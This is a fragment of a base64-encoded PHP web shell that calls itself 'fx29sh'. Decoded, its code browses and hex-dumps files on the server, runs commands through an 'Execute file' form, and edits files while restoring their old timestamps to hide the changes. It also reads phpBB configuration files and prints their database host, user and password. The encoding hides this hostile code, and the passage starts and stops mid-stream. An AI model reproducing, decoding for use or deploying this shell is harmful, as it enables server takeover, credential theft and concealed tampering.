ltZyZpbWc9ZXh0X2dpZlwiIGJvcmRlcj1cIjBcIj4iLCJpbWciKSwKICAgICAgICBhcnJheSgiPGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1leHRfaW5pXCIgYm9yZGVyPVwiMFwiPiIsImluaSIpLAogICAgICAgIGFycmF5KCI8aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPWRvd25sb2FkXCIgYm9yZGVyPVwiMFwiPiIsImRvd25sb2FkIiksCiAgICAgICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9ZXh0X3J0ZlwiIGJvcmRlcj1cIjBcIj4iLCJub3RlcGFkIiksCiAgICAgICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9Y2hhbmdlXCIgYm9yZGVyPVwiMFwiPiIsImVkaXQiKQogICAgKTsKICAgIGVjaG8gIjxiPlZpZXdpbmcgZmlsZTombmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPWV4dF8iLiRleHQuIlwiIGJvcmRlcj1cIjBcIj4mbmJzcDsiLiRmLiIgKCIudmlld19zaXplKGZpbGVzaXplKCRkLiRmKSkuIikgJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Ii52aWV3X3Blcm1zX2NvbG9yKCRkLiRmKS4iPC9iPjxicj5TZWxlY3QgYWN0aW9uL2ZpbGUtdHlwZTo8YnI+IjsKICAgIGZvcmVhY2goJGFyciBhcyAkdCkgewogICAgICBpZiAoJHRbMV0gPT0gJHJmdCkge2VjaG8gIiA8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0iLnVybGVuY29kZSgkZikuIiZmdD0iLiR0WzFdLiImZD0iLnVybGVuY29kZSgkZCkuIlwiPjxmb250IGNvbG9yPWdyZWVuPiIuJHRbMF0uIjwvZm9udD48L2E+Ijt9CiAgICAgIGVsc2VpZiAoJHRbMV0gPT0gJGZ0KSB7ZWNobyAiIDxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9ZiZmPSIudXJsZW5jb2RlKCRmKS4iJmZ0PSIuJHRbMV0uIiZkPSIudXJsZW5jb2RlKCRkKS4iXCI+PGI+PHU+Ii4kdFswXS4iPC91PjwvYj48L2E+Ijt9CiAgICAgIGVsc2Uge2VjaG8gIiA8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0iLnVybGVuY29kZSgkZikuIiZmdD0iLiR0WzFdLiImZD0iLnVybGVuY29kZSgkZCkuIlwiPjxiPiIuJHRbMF0uIjwvYj48L2E+Ijt9CiAgICAgIGVjaG8gIiAoPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1mJmY9Ii51cmxlbmNvZGUoJGYpLiImZnQ9Ii4kdFsxXS4iJndoaXRlPTEmZD0iLnVybGVuY29kZSgkZCkuIlwiIHRhcmdldD1cIl9ibGFua1wiPis8L2E+KSB8IjsKICAgIH0KICAgIGVjaG8gIjxociBzaXplPVwiMVwiIG5vc2hhZGU+IjsKICAgIGlmICgkZnQgPT0gImluZm8iKSB7CiAgICAgIGVjaG8gIjxiPkluZm9ybWF0aW9uOjwvYj48dGFibGUgYm9yZGVyPTAgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yPjx0cj48dGQ+PGI+UGF0aDwvYj48L3RkPjx0ZD4gIi4kZC4kZi4iPC90ZD48L3RyPjx0cj48dGQ+PGI+U2l6ZTwvYj48L3RkPjx0ZD4gIi52aWV3X3NpemUoZmlsZXNpemUoJGQuJGYpKS4iPC90ZD48L3RyPjx0cj48dGQ+PGI+TUQ1PC9iPjwvdGQ+PHRkPiAiLm1kNV9maWxlKCRkLiRmKS4iPC90ZD48L3RyPiI7CiAgICAgIGlmICghJHdpbikgewogICAgICAgIGVjaG8gIjx0cj48dGQ+PGI+T3duZXIvR3JvdXA8L2I+PC90ZD48dGQ+ICI7CiAgICAgICAgJG93ID0gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRkLiRmKSk7CiAgICAgICAgJGdyID0gcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRkLiRmKSk7CiAgICAgICAgZWNobyAoJG93WyJuYW1lIl0/JG93WyJuYW1lIl06ZmlsZW93bmVyKCRkLiRmKSkuIi8iLigkZ3JbIm5hbWUiXT8kZ3JbIm5hbWUiXTpmaWxlZ3JvdXAoJGQuJGYpKTsKICAgICAgfQogICAgICBlY2hvICI8dHI+PHRkPjxiPlBlcm1zPC9iPjwvdGQ+PHRkPjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9Y2htb2QmZj0iLnVybGVuY29kZSgkZikuIiZkPSIudXJsZW5jb2RlKCRkKS4iXCI+Ii52aWV3X3Blcm1zX2NvbG9yKCRkLiRmKS4iPC9hPjwvdGQ+PC90cj48dHI+PHRkPjxiPkNyZWF0ZSB0aW1lPC9iPjwvdGQ+PHRkPiAiLmRhdGUoImQvbS9ZIEg6aTpzIixmaWxlY3RpbWUoJGQuJGYpKS4iPC90ZD48L3RyPjx0cj48dGQ+PGI+QWNjZXNzIHRpbWU8L2I+PC90ZD48dGQ+ICIuZGF0ZSgiZC9tL1kgSDppOnMiLGZpbGVhdGltZSgkZC4kZikpLiI8L3RkPjwvdHI+PHRyPjx0ZD48Yj5NT0RJRlkgdGltZTwvYj48L3RkPjx0ZD4gIi5kYXRlKCJkL20vWSBIOmk6cyIsZmlsZW10aW1lKCRkLiRmKSkuIjwvdGQ+PC90cj48L3RhYmxlPiI7CiAgICAgICRmaSA9IGZvcGVuKCRkLiRmLCJyYiIpOwogICAgICBpZiAoJGZpKSB7CiAgICAgICAgaWYgKCRmdWxsaGV4ZHVtcCkge2VjaG8gIjxiPkZVTEwgSEVYRFVNUDwvYj4iOyAkc3RyID0gZnJlYWQoJGZpLGZpbGVzaXplKCRkLiRmKSk7fQogICAgICAgIGVsc2Uge2VjaG8gIjxiPkhFWERVTVAgUFJFVklFVzwvYj4iOyAkc3RyID0gZnJlYWQoJGZpLCRoZXhkdW1wX2xpbmVzKiRoZXhkdW1wX3Jvd3MpO30KICAgICAgICAkbiA9IDA7CiAgICAgICAgJGEwID0gIjAwMDAwMDAwPGJyPiI7CiAgICAgICAgJGExID0gIiI7CiAgICAgICAgJGEyID0gIiI7CiAgICAgICAgZm9yICgkaT0wOyAkaTxzdHJsZW4oJHN0cik7ICRpKyspIHsKICAgICAgICAgICRhMSAuPSBzcHJpbnRmKCIlMDJYIixvcmQoJHN0clskaV0pKS4iICI7CiAgICAgICAgICBzd2l0Y2ggKG9yZCgkc3RyWyRpXSkpIHsKICAgICAgICAgICAgY2FzZSAwOiAgJGEyIC49ICI8Zm9udD4wPC9mb250PiI7IGJyZWFrOwogICAgICAgICAgICBjYXNlIDMyOgogICAgICAgICAgICBjYXNlIDEwOgogICAgICAgICAgICBjYXNlIDEzOiAkYTIgLj0gIiZuYnNwOyI7IGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OiAkYTIgLj0gaHRtbHNwZWNpYWxjaGFycygkc3RyWyRpXSk7CiAgICAgICAgICB9CiAgICAgICAgICAkbisrOwogICAgICAgICAgaWYgKCRuID09ICRoZXhkdW1wX3Jvd3MpIHsKICAgICAgICAgICAgJG4gPSAwOwogICAgICAgICAgICBpZiAoJGkrMSA8IHN0cmxlbigkc3RyKSkgeyRhMCAuPSBzcHJpbnRmKCIlMDhYIiwkaSsxKS4iPGJyPiI7fQogICAgICAgICAgICAkYTEgLj0gIjxicj4iOwogICAgICAgICAgICAkYTIgLj0gIjxicj4iOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlY2hvICI8dGFibGUgYm9yZGVyPTEgYmdjb2xvcj0jNjY2NjY2PiIuCiAgICAgICAgICAgICAiPHRyPjx0ZCBiZ2NvbG9yPSM2NjY2NjY+Ii4kYTAuIjwvdGQ+Ii4KICAgICAgICAgICAgICI8dGQgYmdjb2xvcj0jMDAwMDAwPiIuJGExLiI8L3RkPiIuCiAgICAgICAgICAgICAiPHRkIGJnY29sb3I9IzAwMDAwMD4iLiRhMi4iPC90ZD4iLgogICAgICAgICAgICAgIjwvdHI+PC90YWJsZT48YnI+IjsKICAgICAgfQogICAgICAkZW5jb2RlZCA9ICIiOwogICAgICBpZiAoJGJhc2U2NCA9PSAxKSB7CiAgICAgICAgZWNobyAiPGI+QmFzZTY0IEVuY29kZTwvYj48YnI+IjsKICAgICAgICAkZW5jb2RlZCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGQuJGYpKTsKICAgICAgfQogICAgICBlbHNlaWYoJGJhc2U2NCA9PSAyKSB7CiAgICAgICAgZWNobyAiPGI+QmFzZTY0IEVuY29kZSArIENodW5rPC9iPjxicj4iOwogICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkZC4kZikpKTsKICAgICAgfQogICAgICBlbHNlaWYoJGJhc2U2NCA9PSAzKSB7CiAgICAgICAgZWNobyAiPGI+QmFzZTY0IEVuY29kZSArIENodW5rICsgUXVvdGVzPC9iPjxicj4iOwogICAgICAgICRlbmNvZGVkID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkZC4kZikpOwogICAgICAgICRlbmNvZGVkID0gc3Vic3RyKHByZWdfcmVwbGFjZSgiIS57MSw3Nn0hIiwiJ1xcMCcuXG4iLCRlbmNvZGVkKSwwLC0yKTsKICAgICAgfQogICAgICBlbHNlaWYoJGJhc2U2NCA9PSA0KSB7CiAgICAgICAgJHRleHQgPSBmaWxlX2dldF9jb250ZW50cygkZC4kZik7CiAgICAgICAgJGVuY29kZWQgPSBiYXNlNjRfZGVjb2RlKCR0ZXh0KTsKICAgICAgICBlY2hvICI8Yj5CYXNlNjQgRGVjb2RlIjsKICAgIGlmIChiYXNlNjRfZW5jb2RlKCRlbmNvZGVkKSAhPSAkdGV4dCkge2VjaG8gIiAoZmFpbGVkKSI7fQogICAgZWNobyAiPC9iPjxicj4iOwogICB9CiAgIGlmICghZW1wdHkoJGVuY29kZWQpKQogICB7CiAgICBlY2hvICI8dGV4dGFyZWEgY29scz04MCByb3dzPTEwPiIuaHRtbHNwZWNpYWxjaGFycygkZW5jb2RlZCkuIjwvdGV4dGFyZWE+PGJyPjxicj4iOwogICB9CiAgIGVjaG8gIjxiPkhFWERVTVA6PC9iPjxub2JyPiBbPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1mJmY9Ii51cmxlbmNvZGUoJGYpLiImZnQ9aW5mbyZmdWxsaGV4ZHVtcD0xJmQ9Ii51cmxlbmNvZGUoJGQpLiJcIj5GdWxsPC9hPl0gWzxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9ZiZmPSIudXJsZW5jb2RlKCRmKS4iJmZ0PWluZm8mZD0iLnVybGVuY29kZSgkZCkuIlwiPlByZXZpZXc8L2E+XTxicj48Yj5CYXNlNjQ6IDwvYj4KICAgICAgICA8bm9icj5bPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1mJmY9Ii51cmxlbmNvZGUoJGYpLiImZnQ9aW5mbyZiYXNlNjQ9MSZkPSIudXJsZW5jb2RlKCRkKS4iXCI+RW5jb2RlPC9hPl0mbmJzcDs8L25vYnI+CiAgICAgICAgPG5vYnI+WzxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9ZiZmPSIudXJsZW5jb2RlKCRmKS4iJmZ0PWluZm8mYmFzZTY0PTImZD0iLnVybGVuY29kZSgkZCkuIlwiPitjaHVuazwvYT5dJm5ic3A7PC9ub2JyPgogICAgICAgIDxub2JyPls8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0iLnVybGVuY29kZSgkZikuIiZmdD1pbmZvJmJhc2U2ND0zJmQ9Ii51cmxlbmNvZGUoJGQpLiJcIj4rY2h1bmsrcXVvdGVzPC9hPl0mbmJzcDs8L25vYnI+CiAgICAgICAgPG5vYnI+WzxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9ZiZmPSIudXJsZW5jb2RlKCRmKS4iJmZ0PWluZm8mYmFzZTY0PTQmZD0iLnVybGVuY29kZSgkZCkuIlwiPkRlY29kZTwvYT5dJm5ic3A7PC9ub2JyPgogICAgICAgIDxQPiI7CiAgfQogIGVsc2VpZiAoJGZ0ID09ICJodG1sIikgewogICBpZiAoJHdoaXRlKSB7QG9iX2NsZWFuKCk7fQogICBlY2hvICRyOwogICBpZiAoJHdoaXRlKSB7ZngyOXNoZXhpdCgpO30KICB9CiAgZWxzZWlmICgkZnQgPT0gInR4dCIpIHtlY2hvICI8cHJlPiIuaHRtbHNwZWNpYWxjaGFycygkcikuIjwvcHJlPiI7fQogIGVsc2VpZiAoJGZ0ID09ICJpbmkiKSB7ZWNobyAiPHByZT4iOyB2YXJfZHVtcChwYXJzZV9pbmlfZmlsZSgkZC4kZixUUlVFKSk7IGVjaG8gIjwvcHJlPiI7fQogIGVsc2VpZiAoJGZ0ID09ICJwaHBzZXNzIikgewogICBlY2hvICI8cHJlPiI7CiAgICR2ID0gZXhwbG9kZSgifCIsJHIpOwogICBlY2hvICR2WzBdLiI8YnI+IjsKICAgdmFyX2R1bXAodW5zZXJpYWxpemUoJHZbMV0pKTsKICAgZWNobyAiPC9wcmU+IjsKICB9CiAgZWxzZWlmICgkZnQgPT0gImV4ZSIpIHsKICAgJGV4dCA9IGV4cGxvZGUoIi4iLCRmKTsKICAgJGMgPSBjb3VudCgkZXh0KS0xOwogICAkZXh0ID0gJGV4dFskY107CiAgICRleHQgPSBzdHJ0b2xvd2VyKCRleHQpOwogICAkcmZ0ID0gIiI7CiAgIGZvcmVhY2goJGV4ZWZ0eXBlcyBhcyAkaz0+JHYpCiAgIHsKICAgIGlmIChpbl9hcnJheSgkZXh0LCR2KSkgeyRyZnQgPSAkazsgYnJlYWs7fQogICB9CiAgICRjbWQgPSBzdHJfcmVwbGFjZSgiJWYlIiwkZiwkcmZ0KTsKICAgZWNobyAiPGI+RXhlY3V0ZSBmaWxlOjwvYj48Zm9ybSBhY3Rpb249XCIiLiRzdXJsLiJcIiBtZXRob2Q9UE9TVD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9Y21kPjxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJjbWRcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkY21kKS4iXCIgc2l6ZT1cIiIuKHN0cmxlbigkY21kKSsyKS4iXCI+PGJyPkRpc3BsYXkgaW4gdGV4dC1hcmVhPGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJjbWRfdHh0XCIgdmFsdWU9XCIxXCIgY2hlY2tlZD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1cImRcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkZCkuIlwiPjxicj48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zdWJtaXQgdmFsdWU9XCJFeGVjdXRlXCI+PC9mb3JtPiI7CiAgfQogIGVsc2VpZiAoJGZ0ID09ICJzZGIiKSB7ZWNobyAiPHByZT4iOyB2YXJfZHVtcCh1bnNlcmlhbGl6ZShiYXNlNjRfZGVjb2RlKCRyKSkpOyBlY2hvICI8L3ByZT4iO30KICBlbHNlaWYgKCRmdCA9PSAiY29kZSIpIHsKICAgIGlmIChlcmVnKCJwaHAiLiJCQiAyLiguKikgYXV0by1nZW5lcmF0ZWQgY29uZmlnIGZpbGUiLCRyKSkgewogICAgICAkYXJyID0gZXhwbG9kZSgiXG4iLCRyKTsKICAgICAgaWYgKGNvdW50KCRhcnIgPT0gMTgpKSB7CiAgICAgICAgaW5jbHVkZSgkZC4kZik7CiAgICAgICAgZWNobyAiPGI+cGhwQkIgY29uZmlndXJhdGlvbiBpcyBkZXRlY3RlZCBpbiB0aGlzIGZpbGUhPGJyPiI7CiAgICAgICAgaWYgKCRkYm1zID09ICJteXNxbDQiKSB7JGRibXMgPSAibXlzcWwiO30KICAgICAgICBpZiAoJGRibXMgPT0gIm15c3FsIikge2VjaG8gIjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9c3FsJnNxbF9zZXJ2ZXI9Ii5odG1sc3BlY2lhbGNoYXJzKCRkYmhvc3QpLiImc3FsX2xvZ2luPSIuaHRtbHNwZWNpYWxjaGFycygkZGJ1c2VyKS4iJnNxbF9wYXNzd2Q9Ii5odG1sc3BlY2lhbGNoYXJzKCRkYnBhc3N3ZCkuIiZzcWxfcG9ydD0zMzA2JnNxbF9kYj0iLmh0bWxzcGVjaWFsY2hhcnMoJGRibmFtZSkuIlwiPjxiPjx1PkNvbm5lY3QgdG8gREI8L3U+PC9iPjwvYT48YnI+PGJyPiI7fQogICAgICAgIGVsc2Uge2VjaG8gIkJ1dCwgeW91IGNhbid0IGNvbm5lY3QgdG8gZm9ydW0gc3FsLWJhc2UsIGJlY2F1c2UgZGItc29mdHdhcmU9XCIiLiRkYm1zLiJcIiBpcyBub3Qgc3VwcG9ydGVkIGJ5ICIuJHNoX25hbWUuIi4gUGxlYXNlLCByZXBvcnQgdXMgZm9yIGZpeC4iO30KICAgICAgICBlY2hvICJQYXJhbWV0ZXJzIGZvciBtYW51YWwgY29ubmVjdDo8YnI+IjsKICAgICAgICAkY2ZndmFycyA9IGFycmF5KCJkYm1zIj0+JGRibXMsImRiaG9zdCI9PiRkYmhvc3QsImRibmFtZSI9PiRkYm5hbWUsImRidXNlciI9PiRkYnVzZXIsImRicGFzc3dkIj0+JGRicGFzc3dkKTsKICAgICAgICBmb3JlYWNoICgkY2ZndmFycyBhcyAkaz0+JHYpIHtlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGspLiI9JyIuaHRtbHNwZWNpYWxjaGFycygkdikuIic8YnI+Ijt9CiAgICAgICAgZWNobyAiPC9iPjxociBzaXplPVwiMVwiIG5vc2hhZGU+IjsKICAgICAgfQogICAgfQogICAgZWNobyAiPGRpdiBzdHlsZT1cImJvcmRlciA6IDBweCBzb2xpZCAjRkZGRkZGOyBwYWRkaW5nOiAxZW07IG1hcmdpbi10b3A6IDFlbTsgbWFyZ2luLWJvdHRvbTogMWVtOyBtYXJnaW4tcmlnaHQ6IDFlbTsgbWFyZ2luLWxlZnQ6IDFlbTsgYmFja2dyb3VuZC1jb2xvcjogIi4kaGlnaGxpZ2h0X2JhY2tncm91bmQgLiI7XCI+IjsKICAgIGlmICghZW1wdHkoJHdoaXRlKSkge0BvYl9jbGVhbigpO30KICAgIGhpZ2hsaWdodF9maWxlKCRkLiRmKTsKICAgIGlmICghZW1wdHkoJHdoaXRlKSkge2Z4MjlzaGV4aXQoKTt9CiAgICBlY2hvICI8L2Rpdj4iOwogIH0KICBlbHNlaWYgKCRmdCA9PSAiZG93bmxvYWQiKSB7CiAgICBAb2JfY2xlYW4oKTsKICAgIGhlYWRlcigiQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iKTsKICAgIGhlYWRlcigiQ29udGVudC1sZW5ndGg6ICIuZmlsZXNpemUoJGQuJGYpKTsKICAgIGhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9XCIiLiRmLiJcIjsiKTsKICAgIGVjaG8gJHI7CiAgICBleGl0OwogIH0KICBlbHNlaWYgKCRmdCA9PSAibm90ZXBhZCIpIHsKICAgIEBvYl9jbGVhbigpOwogICAgaGVhZGVyKCJDb250ZW50LXR5cGU6IHRleHQvcGxhaW4iKTsKICAgIGhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9XCIiLiRmLiIudHh0XCI7Iik7CiAgICBlY2hvKCRyKTsKICAgIGV4aXQ7CiAgfQogIGVsc2VpZiAoJGZ0ID09ICJpbWciKSB7CiAgICAkaW5mID0gZ2V0aW1hZ2VzaXplKCRkLiRmKTsKICAgIGlmICghJHdoaXRlKSB7CiAgICAgIGlmIChlbXB0eSgkaW1nc2l6ZSkpIHskaW1nc2l6ZSA9IDIwO30KICAgICAgJHdpZHRoID0gJGluZlswXS8xMDAqJGltZ3NpemU7CiAgICAgICRoZWlnaHQgPSAkaW5mWzFdLzEwMCokaW1nc2l6ZTsKICAgICAgZWNobyAiPGNlbnRlcj48Yj5TaXplOjwvYj4mbmJzcDsiOwogICAgICAkc2l6ZXMgPSBhcnJheSgiMTAwIiwiNTAiLCIyMCIpOwogICAgICBmb3JlYWNoICgkc2l6ZXMgYXMgJHYpIHsKICAgICAgICBlY2hvICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0iLnVybGVuY29kZSgkZikuIiZmdD1pbWcmZD0iLnVybGVuY29kZSgkZCkuIiZpbWdzaXplPSIuJHYuIlwiPiI7CiAgICAgICAgaWYgKCRpbWdzaXplICE9ICR2ICkge2VjaG8gJHY7fQogICAgICAgIGVsc2Uge2VjaG8gIjx1PiIuJHYuIjwvdT4iO30KICAgICAgICBlY2hvICI8L2E+Jm5ic3A7Jm5ic3A7Jm5ic3A7IjsKICAgICAgfQogICAgICBlY2hvICI8YnI+PGJyPjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWYmZj0iLnVybGVuY29kZSgkZikuIiZmdD1pbWcmd2hpdGU9MSZkPSIudXJsZW5jb2RlKCRkKS4iXCIgd2lkdGg9XCIiLiR3aWR0aC4iXCIgaGVpZ2h0PVwiIi4kaGVpZ2h0LiJcIiBib3JkZXI9XCIxXCI+PC9jZW50ZXI+IjsKICAgIH0KICAgIGVsc2UgewogICAgICBAb2JfY2xlYW4oKTsKICAgICAgJGV4dCA9IGV4cGxvZGUoJGYsIi4iKTsKICAgICAgJGV4dCA9ICRleHRbY291bnQoJGV4dCktMV07CiAgICAgIGhlYWRlcigiQ29udGVudC10eXBlOiAiLiRpbmZbIm1pbWUiXSk7CiAgICAgIHJlYWRmaWxlKCRkLiRmKTsKICAgICAgZXhpdDsKICAgIH0KICB9CiAgZWxzZWlmICgkZnQgPT0gImVkaXQiKSB7CiAgIGlmICghZW1wdHkoJHN1Ym1pdCkpCiAgIHsKICAgIGlmICgkZmlsZXN0ZWFsdGgpIHskc3RhdCA9IHN0YXQoJGQuJGYpO30KICAgICRmcCA9IGZvcGVuKCRkLiRmLCJ3Iik7CiAgICBpZiAoISRmcCkge2VjaG8gIjxiPkNhbid0IHdyaXRlIHRvIGZpbGUhPC9iPiI7fQogICAgZWxzZQogICAgewogICAgIGVjaG8gIjxiPlNhdmVkITwvYj4iOwogICAgIGZ3cml0ZSgkZnAsJGVkaXRfdGV4dCk7CiAgICAgZmNsb3NlKCRmcCk7CiAgICAgaWYgKCRmaWxlc3RlYWx0aCkge3RvdWNoKCRkLiRmLCRzdGF0WzldLCRzdGF0WzhdKTt9CiAgICAgJHIgPSAkZWRpdF90ZXh0OwogICAgfQogICB9CiAgICRyb3dzID0gY291bnQoZXhwbG9kZSgiXHJcbiIsJHIpKTsKICAgaWYgKCRyb3dzIDwgMTApIHskcm93cyA9IDEwO30KICAgaWYgKCRyb3dzID4gMzApIHskcm93cyA9IDMwO30KICAgZWNobyAiPGZvcm0gYWN0aW9uPVwiIi4kc3VybC4iYWN0PWYmZj0iLnVybGVuY29kZSgkZikuIiZmdD1lZGl0JmQ9Ii51cmxlbmNvZGUoJGQpLiJcIiBtZXRob2Q9UE9TVD48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zdWJtaXQgdmFsdWU9XCJTYXZlXCI+Jm5ic3A7PGlucHV0IHR5cGU9XCJyZXNldFwiIHZhbHVlPVwiUmVzZXRcIj4mbmJzcDs8aW5wdXQgdHlwZT1cImJ1dHRvblwiIG9uY2xpY2s9XCJsb2NhdGlvbi5ocmVmPSciLmFkZHNsYXNoZXMoJHN1cmwuImFjdD1scyZkPSIuc3Vic3RyKCRkLDAsLTEpKS4iJztcIiB2YWx1ZT1cIkJhY2tcIj48YnI+PHRleHRhcmVhIG5hbWU9XCJlZGl0X3RleHRcIiBjb2xzPVwiMTIyXCIgcm93cz1cIiIuJHJvd3MuIlwiPiIuaHRtbHNwZWNpYWxjaGFycygkcikuIjwvdGV4dGFyZWE+PC9mb3JtPiI7CiAgfQogIGVsc2VpZiAoIWVtcHR5KCRmdCkpIHtlY2hvICI8Y2VudGVyPjxiPk1hbnVhbGx5IHNlbGVjdGVkIHR5cGUgaXMgaW5jb3JyZWN0LiBJZiB5b3UgdGhpbmssIGl0IGlzIG1pc3Rha2UsIHBsZWFzZSBzZW5kIHVzIHVybCBhbmQgZHVtcCBvZiBcJEdMT0JBTFMuPC9iPjwvY2VudGVyPiI7fQogIGVsc2Uge2VjaG8gIjxjZW50ZXI+PGI+VW5rbm93biBmaWxlIHR5cGUgKCIuJGV4dC4iKSwgcGxlYXNlIHNlbGVjdCB0eXBlIG1hbnVhbGx5LjwvYj48L2NlbnRlcj4iO30KfQplY2hvICI8L2Rpdj5cbiI7Cn0KfQplbHNlIHsKQG9iX2NsZWFuKCk7CiRpbWFnZXMgPSBhcnJheSgKImFycm93X2x0ciI9PgoiUjBsR09EbGhKZ0FXQUlBQkFQLy8vd0FBQUNINUJBSG9Bd0VBTEFBQUFBQW1BQllBQUFJdmpJK3B5KzBQRjRpMGdWdnp1VnhYRG5vUSIuCiJTSXJVWkdab2VyS2YyOEtqUE5QT2FrdTVSZlordVFzS2g4UmlvZ0FBT3c9PSIsCiJiYWNrIj0+CiJSMGxHT0RsaEZBQVVBS0lBQUFBQUFQLy8vOTNkM2NEQXdJYUdoZ1FFQlAvLy93QUFBQ0g1QkFFQUFBWUFMQUFBQUFBVUFCUUFBQU04Ii4KImFMcmMvakRLU1dXcGpWeXNTTmlZSjRDVU9CSm9xam5pSUx6d3V6THRZTi8zekJTRXJmNmtCVytnS1JpUFJnaFBoK0VGSzBtT1VFcXQiLgoiV2cwSkFEcz0iLAoiYnVmZmVyIj0+CiJSMGxHT0RsaEZBQVVBS0lBQUFBQUFQLy8vL2o0K04zZDNjek16TEt5c29hR2h2Ly8veUg1QkFFQUFBY0FMQUFBQUFBVUFCUUFBQU5vIi4KImVMcmNyaWJHOTB5NEYxQW11NStOaFkya3hsMkNNS3dyUVJTR3VWanA0TG13REFXcWlBR0ZYQ2hnK3hoblJCK3B0TE9oYWkxY3JFbUQiLgoiRGx3djRjRUM0Nm1pMllnSlFLYXhzRUdERm5uR3dXRFRFemo5anJQUmRiaHVHOENyLzJJTlpJT0VoWHNiRHdrQU93PT0iLAoiY2hhbmdlIj0+CiJSMGxHT0RsaEZBQVVBTVFmQUwzaGo3blgrcHFvMWVqeS9mN1lBY1RiKzh2aCs2RnRINTZXWnR2ci9SQVFFWmVjeDlMbC9QWDYvdjMrIi4KIi8zZUh0NnE4OGVIdS9aa2ZIM3lWeUl1UXQrNzIva09tOTlmby9QOEFabTU3cmtHUzRIZXo2cGlsOW9lcDNHWm1adi8vL3lINUJBRUEiLgoiQUI4QUxBQUFBQUFVQUJRQUFBV2Y0Q2VPWkdtZTZObXRMT3VsWCtjNFRWTlZRN2U5cUZ6Zmc0SEZvbmtkSkE1UzU0Y2JSQW9GeUVPQyIuCiJ3U2lVdG1Za2tyZ3dPQWVBNXpycWFMbGRCaU5NSUplRDI2NlhZVGdRRG01Ung4bWRHK29BYlNZZGFINEdhM2M4SkJNSmFYUUdCUWdBIi4KIkNIa2pFNGFRa1EwQWxTSVRhbitaQVFxa2lpUVBqMUFGQWFNS0VLWWpEMzlRckt3S0FhOG5HUUs4QWd1L0N4VENzQ01leHNmSXhqREwiLgoiek1zaEFEcz0iLAoiZGVsZXRlIj0+CiJSMGxHT0RsaEZBQVVBT1paQVB6OC9OUEZ5TmdITHMwWU92UHo4L2IyOXNhY3BOWFYxZlgxOWN3WE9mRHc4S2VucC9uNStldGdldW5wIi4KIjZkY0dMTU1wUnVycTZwS1NrdHZiMisvdjcrMXdoM1IwZFBuUDE3aUFpcHh5ZWw5Zlg3ZGpjc2NTTTkzZDNaR1JrZUVzVGV2ZDRMQ3ciLgoic0dSa1pHcE9VK0lmUStFUU5vaDZmZEljUGVIaDRZV0ZoYkpRWXZMeTh1aSt4bTV1YnN4Y2NPeDhrY000VXRZOVdlQWRRWW1KaWZXdiIuCiJ2SHg4Zk1uSnljTTNVZjN2OHJSdWU5OE9OYk96czlZRks1U1VsS1lvUCtUazVOMG9TdWZuNTdaR1dzUXJSOWtJTDVDUWtPUGo0MlZsIi4KIlplQVBOdWRBWDlzS01QdjcrMTVRVTV1Ym0zOS9mOGU1dTR4aWF0cmEydWJLejhQRHcrcGZlZTkvbE1LMHQ4MXJmZDhBS2YvLy93QUEiLgoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIuCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0g1Ii4KIkJBRUFBRmtBTEFBQUFBQVVBQlFBQUFlc2dGbUNnNFNGaG9lSWhpVWZJSW1JTWxnUUI0NkdMQWxZUWthRlZWaFNBSVpMVDVjYkVZSTQiLgoiU1RvNU14T2ZoUXdCQTFnWUNoY2tRQmsxT3dpSUFMQUNMa2d4SmlsVEJJNjlSRmhERmg0SERKUlpWRmdQUEZCUjBGa05XRGRNSEE4RyIuCiJCWlRh